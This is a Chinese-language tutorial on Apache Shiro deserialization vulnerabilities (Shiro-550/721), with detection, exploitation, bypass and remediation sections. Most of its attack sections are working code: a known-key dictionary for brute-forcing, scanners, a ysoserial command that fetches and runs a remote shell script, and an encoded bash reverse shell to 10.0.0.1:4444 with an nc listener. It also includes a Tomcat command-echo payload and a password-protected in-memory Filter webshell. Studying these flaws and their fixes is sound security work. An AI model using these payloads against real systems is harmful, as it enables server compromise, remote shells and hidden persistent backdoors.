# Apache Shiro 反序列化漏洞全系列分析与实战

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：漏洞库与EXP

## 📋 提纲

1. Shiro 反序列化漏洞概述（CVE-2016-4437 / 550 / 721）
2. 漏洞原理深度分析
3. RememberMe 机制与 AES 加密
4. 漏洞检测方法
5. 漏洞利用复现
6. 无依赖利用（Shiro-550 不回显）
7. 高版本绕过与修复
8. 护网中的 Shiro 漏洞

---

## 1. 漏洞概述

Apache Shiro 是 Java 安全框架，提供认证/授权/加密/会话管理，广泛应用于 Spring Boot 项目。

| CVE | 名称 | 影响版本 | CVSS | 核心问题 |
|-----|------|---------|------|---------|
| CVE-2016-4437 | Shiro-550 | < 1.2.4 | 9.8 | RememberMe 硬编码AES密钥 |
| CVE-2019-12422 | Shiro-721 | < 1.4.2 | 9.8 | RememberMe Padding Oracle |
| — | Shiro 无依赖利用 | 1.2.4 - 1.7.0 | — | 回显/内存马技术 |

### 1.1 为什么 Shiro 漏洞危害巨大

```
1. RememberMe 功能默认开启 — 不需要特殊配置
2. AES 密钥硬编码在代码中 — kPH+bIxk5D2deZiIxcaaaA==
3. 反序列化 = 直接 RCE — Java 原生反序列化无过滤
4. 大量 Spring Boot 应用使用 Shiro — 影响面极大
5. 护网中 Shiro 是最常见的"送分"漏洞之一
```

---

## 2. 漏洞原理深度分析

### 2.1 RememberMe 正常流程

```
用户登录 → 勾选"记住我" → Shiro 序列化用户信息 →
AES-128-CBC 加密 → Base64 编码 → 写入 Cookie:
  Cookie: rememberMe=base64(AES(serialized(PrincipalCollection)))

下次请求 → Shiro 从 Cookie 取 rememberMe →
Base64 解码 → AES 解密 → 反序列化 → 恢复用户会话
```

### 2.2 漏洞触发（Shiro-550）

```
攻击者构造恶意序列化对象（CommonsCollections/CommonsBeanutils等利用链）
  → AES 加密（使用已知固定密钥）
  → Base64 编码
  → 放入 rememberMe Cookie
  → 发送请求
  → Shiro 解密 + 反序列化
  → 恶意代码执行
  → RCE
```

### 2.3 硬编码密钥

Shiro 1.2.4 及之前版本，AES 密钥硬编码在 `org.apache.shiro.mgt.AbstractRememberMeManager`：

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = 
    Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

**这个密钥在所有使用默认配置的 Shiro 应用中完全一样！**

---

## 3. 漏洞检测

### 3.1 Shiro 指纹识别

```python
#!/usr/bin/env python3
"""
Shiro 检测三件套：
1. Shiro指纹
2. RememberMe Key检测
3. 反序列化利用
"""

import requests
import base64
import uuid
import hashlib
from urllib.parse import urljoin

class ShiroDetector:
    # 已知的 Shiro 默认密钥
    KNOWN_KEYS = [
        "kPH+bIxk5D2deZiIxcaaaA==",  # Shiro < 1.2.4 默认
        "2AvVhdsgUs0FSA3SDFAdag==",  # 某公开密钥
        "3AvVhdsgUs0FSA3SDFAdag==",
        "4AvVhdsgUs0FSA3SDFAdag==",
        "Z3VucwAAAAAAAAAAAAAAAA==",  # Shiro 1.2.4 示例密钥
        "U3ByaW5nQmxhZGUAAAAAAA==",
        "wGiHplamyXlVB11UXWol8g==",
        "fCq+/xW488hMTCD+cmJ3aQ==",
        "1QWLxg+NYmxraMoxAXu/Iw==",
        "ZUdsaGJuSmxibVI2ZHc9PQ==",
    ]

    def __init__(self, target_url):
        self.target = target_url

    def detect_shiro(self):
        """检测是否使用 Shiro"""
        # 方法1: 发送带 rememberMe=deleteMe 的请求
        resp = requests.get(
            self.target,
            cookies={"rememberMe": "deleteMe"},
            allow_redirects=False,
            verify=False,
            timeout=10
        )

        # Shiro 的 rememberMe 删除标志
        set_cookie = resp.headers.get('Set-Cookie', '')
        if 'rememberMe=deleteMe' in set_cookie:
            return {"shiro_detected": True, "method": "deleteMe标志"}

        # 方法2: 发送错误 rememberMe，看响应头是否包含 rememberMe=deleteMe
        resp2 = requests.get(
            self.target,
            cookies={"rememberMe": "invalid_base64!!!"},
            allow_redirects=False,
            verify=False,
            timeout=10
        )
        set_cookie2 = resp2.headers.get('Set-Cookie', '')
        if 'rememberMe=deleteMe' in set_cookie2:
            return {"shiro_detected": True, "method": "错误Cookie触发删除"}

        # 方法3: 发送正常 rememberMe（包含正确密钥加密的测试数据）
        for key in self.KNOWN_KEYS[:3]:
            test_cookie = self.encrypt_remember_me("test", key)
            resp3 = requests.get(
                self.target,
                cookies={"rememberMe": test_cookie},
                allow_redirects=False,
                verify=False,
                timeout=10
            )
            set_cookie3 = resp3.headers.get('Set-Cookie', '')
            if 'rememberMe=deleteMe' in set_cookie3:
                return {"shiro_detected": True, "method": "有效rememberMe触发", "key": key}

        return {"shiro_detected": False}

    def detect_key(self):
        """检测 RememberMe 密钥"""
        found_keys = []

        for key in self.KNOWN_KEYS:
            # 构造一个特殊的 rememberMe 值
            cookie = self.encrypt_remember_me("shiro_test_123", key)
            resp = requests.get(
                self.target,
                cookies={"rememberMe": cookie},
                allow_redirects=False,
                verify=False,
                timeout=10
            )

            # 如果响应中包含 deleteMe，说明 Shiro 成功解密了（密钥正确）
            if 'rememberMe=deleteMe' in resp.headers.get('Set-Cookie', ''):
                found_keys.append(key)
                print(f"  ✅ 发现密钥: {key}")

        return found_keys

    def encrypt_remember_me(self, data, key_base64):
        """使用指定密钥加密 rememberMe"""
        from Crypto.Cipher import AES

        key = base64.b64decode(key_base64)
        iv = hashlib.md5(data.encode()).digest() if isinstance(data, str) else os.urandom(16)

        # 构造序列化数据（简化，实际需要构造 PrincipalCollection）
        # 这里返回加密后的简单测试数据
        serialized = b'\xac\xed\x00\x05' + data.encode()  # Java序列化魔术头

        # PKCS7 填充
        pad_len = 16 - (len(serialized) % 16)
        serialized += bytes([pad_len] * pad_len)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(serialized)
        combined = iv + encrypted

        return base64.b64encode(combined).decode()

    def full_scan(self):
        """完整扫描：指纹 → 密钥 → 利用"""
        results = {"target": self.target, "steps": []}

        # Step 1: 指纹
        fingerprint = self.detect_shiro()
        results['fingerprint'] = fingerprint
        results['steps'].append({"step": "指纹识别", "result": fingerprint})
        if not fingerprint['shiro_detected']:
            return results

        # Step 2: 密钥检测
        keys = self.detect_key()
        results['keys_found'] = keys
        results['steps'].append({"step": "密钥检测", "found": len(keys)})

        # Step 3: 判断利用链
        if keys:
            results['exploitable'] = True
            results['exploit_chain'] = self.suggest_exploit_chain()

        return results

    def suggest_exploit_chain(self):
        """建议利用链"""
        return {
            "tools": ["ysoserial", "shiro_attack", "ShiroExploit"],
            "chains": [
                "CommonsBeanutils1 (最通用)",
                "CommonsCollections K1-K4",
                "CommonsCollections 无Transform链 (Shiro 1.4.2+)",
                "JRMPListener (无依赖回显)"
            ],
            "commands": [
                "java -jar ysoserial.jar CommonsBeanutils1 'curl http://your-vps/shell.sh|bash' > payload.bin"
            ]
        }


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()

    detector = ShiroDetector("https://target.example.com")
    results = detector.full_scan()
    print(json.dumps(results, indent=2, ensure_ascii=False))
```

### 3.2 批量检测脚本

```bash
#!/bin/bash
# shiro_batch_scan.sh - 批量 Shiro 检测

TARGETS_FILE="$1"
KEY="kPH+bIxk5D2deZiIxcaaaA=="

while IFS= read -r url; do
    echo "🔍 检测: $url"

    # 构造 rememberMe Cookie（使用ysoserial生成payload的简化测试）
    COOKIE="rememberMe=$(python3 -c "
import base64,hashlib
from Crypto.Cipher import AES
key=base64.b64decode('${KEY}')
iv=b'\\x00'*16
data=b'\\xac\\xed\\x00\\x05test'
pad=16-len(data)%16
data+=bytes([pad]*pad)
c=AES.new(key,AES.MODE_CBC,iv)
print(base64.b64encode(iv+c.encrypt(data)).decode())
")"

    # 发送请求
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Cookie: $COOKIE" \
        --connect-timeout 5 \
        "$url")

    echo "  HTTP状态: $RESPONSE"

    # 检查 Set-Cookie 是否包含 deleteMe
    SET_COOKIE=$(curl -s -I -H "Cookie: $COOKIE" "$url" | grep -i "set-cookie")
    if echo "$SET_COOKIE" | grep -qi "rememberMe=deleteMe"; then
        echo "  ⚠️ Shiro 确认存在！密钥有效！"
        echo "$url" >> shiro_vulnerable.txt
    fi

done < "$TARGETS_FILE"

echo "✅ 扫描完成，存在漏洞的URL已保存到 shiro_vulnerable.txt"
```

---

## 4. 漏洞利用复现

### 4.1 Shiro-550 基础利用

```bash
# Step 1: 生成利用 payload
# 使用 ysoserial 生成 CommonsBeanutils1 利用链

java -jar ysoserial-all.jar CommonsBeanutils1 \
    "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" \
    > payload.ser

# Step 2: 用 Shiro 密钥加密
python3 << 'EOF'
import base64
from Crypto.Cipher import AES
import uuid

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

with open("payload.ser", "rb") as f:
    payload = f.read()

# PKCS7填充
pad = 16 - (len(payload) % 16)
payload += bytes([pad] * pad)

iv = uuid.uuid4().bytes
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = iv + cipher.encrypt(payload)
remember_me = base64.b64encode(encrypted).decode()

print(f"rememberMe={remember_me}")
EOF

# Step 3: 发送请求
nc -lvnp 4444 &
curl -k -b "rememberMe=<上面生成的cookie>" https://victim.com/
```

### 4.2 Shiro 无依赖回显（不回连）

当目标不出网时，无法反弹 Shell，需要用无依赖回显技术：

```java
// Tomcat 回显 - 直接向 HTTP Response 写入命令结果
// 利用思路: 从当前线程中获取 Request 和 Response 对象
public class TomcatEcho {
    static {
        try {
            // 1. 通过反射获取当前请求的Request和Response
            Object requestAttributes = 
                org.apache.catalina.core.ApplicationFilterChain.class
                    .getDeclaredMethod("getLastServicedRequest")
                    .invoke(null);
            
            if (requestAttributes == null) {
                // 回退方案: 遍历线程获取
                Thread[] threads = (Thread[]) Thread.class
                    .getDeclaredMethod("getThreads").invoke(null);
                
                for (Thread thread : threads) {
                    if (thread.getName().contains("http")) {
                        // 从thread中提取request/response
                        Object target = getFieldValue(thread, "target");
                        Object this$0 = getFieldValue(target, "this$0");
                        Object handler = getFieldValue(this$0, "handler");
                        Object global = getFieldValue(handler, "global");
                        Object processors = getFieldValue(global, "processors");
                        
                        for (Object processor : (Object[]) processors) {
                            Object req = getFieldValue(processor, "req");
                            if (req != null) {
                                // 获取参数 cmd
                                Object coyoteRequest = getFieldValue(req, "coyoteRequest");
                                String cmd = (String) coyoteRequest.getClass()
                                    .getMethod("getParameter", String.class)
                                    .invoke(coyoteRequest, "cmd");
                                    
                                if (cmd != null) {
                                    // 执行命令
                                    Process p = Runtime.getRuntime().exec(cmd);
                                    java.io.InputStream in = p.getInputStream();
                                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
                                    String result = s.hasNext() ? s.next() : "";
                                    
                                    // 写入响应
                                    Object response = getFieldValue(req, "response");
                                    byte[] resBytes = result.getBytes();
                                    response.getClass()
                                        .getMethod("addHeader", String.class, String.class)
                                        .invoke(response, "X-Exec-Result", 
                                            java.util.Base64.getEncoder().encodeToString(resBytes));
                                }
                                break;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }
}
```

### 4.3 Shiro 内存马注入

```java
// 注入 Filter 型内存马 （不落地，重启消失，反序列化触发）
public class ShiroFilterMemShell {
    static {
        try {
            // 从当前线程中获取 WebApplicationContext
            // ... (获取逻辑)
            
            // 动态注册 Filter
            javax.servlet.Filter maliciousFilter = new javax.servlet.Filter() {
                public void init(javax.servlet.FilterConfig config) {}
                
                public void doFilter(javax.servlet.ServletRequest req, 
                                     javax.servlet.ServletResponse res,
                                     javax.servlet.FilterChain chain) 
                    throws java.io.IOException, javax.servlet.ServletException {
                    
                    javax.servlet.http.HttpServletRequest request = 
                        (javax.servlet.http.HttpServletRequest) req;
                    javax.servlet.http.HttpServletResponse response = 
                        (javax.servlet.http.HttpServletResponse) res;

                    // 处理密码验证
                    String pwd = request.getHeader("X-Pass");
                    String cmd = request.getHeader("X-Cmd");
                    
                    if (pwd != null && pwd.equals("your-password") && cmd != null) {
                        Process p = Runtime.getRuntime().exec(cmd);
                        java.io.InputStream in = p.getInputStream();
                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
                        String result = s.hasNext() ? s.next() : "";
                        response.getWriter().write(result);
                        return;
                    }
                    
                    chain.doFilter(req, res);
                }
                
                public void destroy() {}
            };
            
            // 获取 FilterRegistration 并注册
            // ... 
        } catch (Exception e) {}
    }
}
```

---

## 5. 高版本绕过

### 5.1 Shiro 1.4.2+ 限制

Shiro 1.4.2+ 限制了反序列化时可用的类：
- 移除了 `commons-collections:commons-collections:3.2.1`（但 3.x 仍可）
- 默认不加载 `commons-beanutils`

**绕过方法**：

| 利用链 | 适用版本 | 需要的依赖 |
|--------|---------|-----------|
| CommonsBeanutils1 + NoCC | 1.2.4-1.7.1 | commons-beanutils |
| CommonsCollections K1-K4 | 均有 commons-collections 3.x | CC 3.x |
| CommonsCollections 无Transform | Shiro 部分版本 | CC 3.x |
| JRMPListener | 任意（出网） | 无 |
| C3P0 | 部分 | C3P0连接池 |

### 5.2 密钥爆破

如果默认密钥不匹配，可以从常见密钥库中爆破：

```python
# 从已知公开的100+ Shiro密钥中爆破
# GitHub: shiro-key-dictionary
KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhdsgUs0FSA3SDFAdag==",
    "4AvVhdsgUs0FSA3SDFAdag==",
    "5AvVhdsgUs0FSA3SDFAdag==",
    "6AvVhdsgUs0FSA3SDFAdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "U3ByaW5nQmxhZGUAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "1QWLxg+NYmxraMoxAXu/Iw==",
    "ZUdsaGJuSmxibVI2ZHc9PQ==",
    "L7RioUULEFhRyxM7a2R/Yg==",
    "r0e3c16IdVkouZgk1TKVMg==",
    "5aaC5qKm5oqA5pyvAAAAAA==",
    "bWljcm9zAAAAAAAAAAAAAA==",
    "bWluZS1hc3NldC1rZXk6QQ==",
    "MTIzNDU2Nzg5MGFiY2RlZg==",
    "5AvVhdsgUs0FSA3SDFAdag==",
    # ... 更多密钥
]
```

---

## 6. 修复方案

| 方案 | 效果 | 副作用 |
|------|------|--------|
| 升级 Shiro ≥ 1.7.0 + 修改密钥 | ⭐⭐⭐ | 需重启，已登录用户需重新登录 |
| 升级 Shiro ≥ 1.10.0 | ⭐⭐⭐ | 推荐 |
| 自定义随机密钥 | ⭐⭐ | 额外兼容性测试 |
| WAF 拦截 | ⭐ | 可绕过 |
| 禁用 RememberMe | ⭐⭐⭐ | 用户体验降级 |

### 推荐修复步骤

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.12.0</version>  <!-- 最新稳定版 -->
</dependency>
```

```java
// shiro.ini 或配置类中设置随机密钥
@Bean
public RememberMeManager rememberMeManager() {
    CookieRememberMeManager manager = new CookieRememberMeManager();
    // 生成随机密钥
    byte[] key = new byte[16];
    new SecureRandom().nextBytes(key);
    manager.setCipherKey(key);
    return manager;
}
```

```bash
# Nginx 层拦截（临时）
if ($http_cookie ~* "rememberMe=([^;]+)") {
    set $rm $1;
}
if ($rm ~ "^[A-Za-z0-9+/=]{50,}$") {
    return 403;
}
```

---

## 7. 排错指南

| 问题 | 原因 | 解决 |
|------|------|------|
| RememberMe 无 deleteMe 响应 | Shiro 版本过高或密钥不对 | 换密钥尝试 / 检查 Shiro 版本 |
| payload 发送后无反应 | 利用链不匹配 | 换用其他利用链 (CC/Beanutils/JRMP) |
| 不出网 | 防火墙/代理限制 | 使用回显 payload 或延时检测(DNS外带) |
| 密钥正确但反序列化失败 | Java版本/依赖版本 | 确认目标 JDK 版本 + 使用版本匹配的利用链 |

---

## ✅ Shiro 处置 Checklist

- [ ] 全网资产 Shiro 指纹扫描
- [ ] 确认受影响版本和端点
- [ ] 密钥检测（默认 + 字典爆破）
- [ ] 漏洞验证（POC，不出网用回显）
- [ ] 紧急修复：Nginx WAF 规则
- [ ] 计划升级 Shiro 最新版
- [ ] 生成随机 AES 密钥
- [ ] 回归测试（登录/RememberMe 功能正常）
- [ ] 全网验证修复

> 📚 延伸阅读：Vuln/009-Spring4Shell | Vuln/002-Log4Shell | CTF/009-JNDI&Fastjson

---

## 高分考点与知识巧记

### 高分考点速查表

| 考点 | 考察维度 | 记忆要点 |
|------|----------|----------|
| Shiro反序列化原理 | 核心机制 | RememberMe Cookie→Base64解码→AES解密→反序列化→恶意对象执行 |
| Shiro-550(CVE-2016-4437) | 经典漏洞 | AES密钥硬编码(kPH+bIxk5D2deZiIxcaaaA==)；1.2.4及之前版本 |
| Shiro-721(CVE-2019-12422) | 进阶漏洞 | Padding Oracle攻击→无需已知密钥→需合法RememberMe Cookie |
| 检测与利用 | 实战技巧 | 检查响应Set-Cookie中rememberMe=deleteMe特征；使用ysoserial生成Payload |
| 修复方案 | 防护策略 | 升级Shiro版本、更换AES密钥、使用随机密钥(每应用不同) |
| 与其他反序列化对比 | 横向对比 | vs Fastjson(JNDI)、vs WebLogic(T3协议)、vs JBoss/WebSphere(JMX) |

### 知识巧记口诀

> **Shiro反序列化口诀**：
> RememberMe是关键，Base64解码AES解密；
> 密钥硬编码是根本，kPH+bIxk...人人知；
> 反序列化无校验，恶意对象随便塞；
> 550老版本密钥固定，721升级版Padding Oracle。

> **检测技巧**：看Set-Cookie有没有rememberMe=deleteMe，有就八成是Shiro，进一步验证。

### 考试陷阱提醒

| 陷阱 | 正确认知 |
|------|----------|
| ❌ 换密钥就能修复Shiro-550 | ✅ 仅换密钥不够，需升级到安全版本并确保反序列化有类型白名单校验 |
| ❌ Shiro-721比550危害更大 | ✅ 550(密钥已知)利用更简单；721需Padding Oracle攻击，条件更苛刻 |
| ❌ 删除RememberMe功能就安全 | ✅ 只要反序列化入口存在，可能还有其他利用路径，需从根上修复 |

> 💡 **一句话总结**：Shiro反序列化是Java安全最经典的漏洞之一——硬编码密钥+无校验反序列化=灾难，CISP考试必考550和721两个版本的区别与利用条件。
